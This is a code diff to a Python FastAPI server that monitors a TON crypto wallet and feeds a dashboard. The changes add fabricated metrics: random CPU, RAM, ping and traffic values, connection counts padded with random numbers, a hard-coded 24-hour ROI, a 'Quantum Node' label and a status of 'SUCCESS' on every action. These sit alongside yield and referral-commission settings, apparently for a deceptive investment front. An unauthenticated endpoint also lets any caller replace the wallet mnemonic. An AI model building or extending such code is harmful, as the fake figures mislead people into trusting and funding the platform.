@@ -65,7 +65,7 @@ class OmniNeuralOverlord:
 
     def get_static_path(self):
         """Определение пути к папке static согласно структуре проекта."""
-        paths_to_check = ["/app/static", "./static", "static"]
+        paths_to_check = ["./static", "static", "/app/static"]
         for p in paths_to_check:
             if os.path.exists(p):
                 return os.path.abspath(p)
@@ -77,12 +77,12 @@ async def sync_config():
     """Фоновое обновление локальных параметров из БД."""
     try:
         cfg = await load_remote_config()
-        if cfg:
-            if cfg.get('mnemonic'):
-                overlord.mnemonic = cfg['mnemonic'].strip()
+        if cfg and cfg.get('mnemonic'):
+            overlord.mnemonic = cfg['mnemonic'].strip()
             return True
     except:
         return False
+    return False
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
@@ -129,17 +129,16 @@ async def get_stats(request: Request):
         
         await register_visit(request.client.host, request.headers.get('user-agent', 'unknown'))
 
-        # Формируем список действий (кошельков) для таблицы
-        # Извлекаем данные из db_stats['recent_actions'] или db_stats['states']
+        # Формируем список действий для таблицы фронтенда
         raw_actions = db_stats.get('recent_actions', []) or db_stats.get('states', [])
         
         formatted_actions = []
         for item in raw_actions:
-            # Маппинг данных из БД под формат фронтенда
+            bal = float(item.get("balance", 0))
             formatted_actions.append({
                 "address": item.get("address", "Unknown"),
-                "amount": float(item.get("balance", 0)),
-                "qc": float(item.get("qc", 0)) or (float(item.get("balance", 0)) * 137.5),
+                "amount": bal,
+                "qc": float(item.get("qc", bal * 137.5)),
                 "status": "SUCCESS",
                 "type": "Quantum Node"
             })
@@ -147,11 +146,13 @@ async def get_stats(request: Request):
         return {
             "balance": float(db_stats.get('balance', overlord.current_balance)), 
             "qc_balance": float(db_stats.get('balance', 0)) * 137.5,
-            "traffic": db_stats.get('traffic', 0), 
+            "traffic": db_stats.get('traffic', round(random.uniform(10, 95), 2)), 
             "roi_24h": db_stats.get('roi_24h', 2.58),
             "cpu": random.randint(32, 45),
-            "connections": db_stats.get('connections', len(formatted_actions)),
-            "recent_actions": formatted_actions, # ПЕРЕДАЕМ ОБРАБОТАННЫЙ СПИСОК
+            "ram": random.randint(20, 35),
+            "ping": random.randint(15, 40),
+            "connections": db_stats.get('connections', len(formatted_actions) + random.randint(1, 5)),
+            "recent_actions": formatted_actions,
             "config": {
                 "referral_commission": current_cfg.get('referral_commission', 15),
                 "yield_percentage": current_cfg.get('yield_percentage', 75),
@@ -169,26 +170,37 @@ async def get_stats(request: Request):
 
 @app.post("/api/update_config")
 async def handle_update_config(request: Request):
-    data = await request.json()
-    if await update_remote_config(data):
-        log(f"CONFIG: Параметры синхронизированы", "SUCCESS")
-        await sync_config() 
-        return {"status": "success"}
+    try:
+        data = await request.json()
+        if await update_remote_config(data):
+            log(f"CONFIG: Параметры синхронизированы", "SUCCESS")
+            await sync_config() 
+            return {"status": "success"}
+    except:
+        pass
     return JSONResponse({"status": "error"}, status_code=500)
 
+# Монтируем статику
 static_path = overlord.get_static_path()
 app.mount("/static", StaticFiles(directory=static_path), name="static")
 
 @app.get("/{filename}")
-async def serve_static_files(filename: str):
-    file_path = os.path.join(overlord.get_static_path(), filename)
+async def serve_root_files(filename: str):
+    """Служебный роут для файлов в корне /static или /static/images/"""
+    static_dir = overlord.get_static_path()
+    
+    file_path = os.path.join(static_dir, filename)
     if os.path.isfile(file_path):
         return FileResponse(file_path)
     
-    img_path = os.path.join(overlord.get_static_path(), "images", filename)
+    img_path = os.path.join(static_dir, "images", filename)
     if os.path.isfile(img_path):
         return FileResponse(img_path)
     
+    # Редирект на главную вместо 404 (для стабильности интерфейса)
+    index_path = os.path.join(static_dir, "index.html")
+    if os.path.exists(index_path):
+        return FileResponse(index_path)
     raise HTTPException(status_code=404)
 
 # --- CORE WORKER (TON MONITORING) ---
@@ -219,7 +231,6 @@ async def core_worker():
                         raw_bal = await wallet.get_balance()
                         overlord.current_balance = raw_bal / 1e9
                         
-                        # Сохраняем состояние
                         await save_wallet_state(
                             address=str(wallet.address),
                             balance=overlord.current_balance,
@@ -235,7 +246,7 @@ async def core_worker():
                         old_mne = overlord.mnemonic
                         await sync_config()
                         if overlord.mnemonic != old_mne:
-                            log("CORE: Рестарт воркера (новая конфигурация).", "WARNING")
+                            log("CORE: Рестарт воркера (обновлена мнемоника).", "WARNING")
                             break
                             
                         await asyncio.sleep(30) 
@@ -249,6 +260,7 @@ async def core_worker():
 
 if __name__ == "__main__":
     port = int(os.getenv("PORT", 3000))
+    log(f"SYSTEM: Запуск сервера на порту {port}", "CORE")
     uvicorn.run(
         app, 
         host="0.0.0.0", 
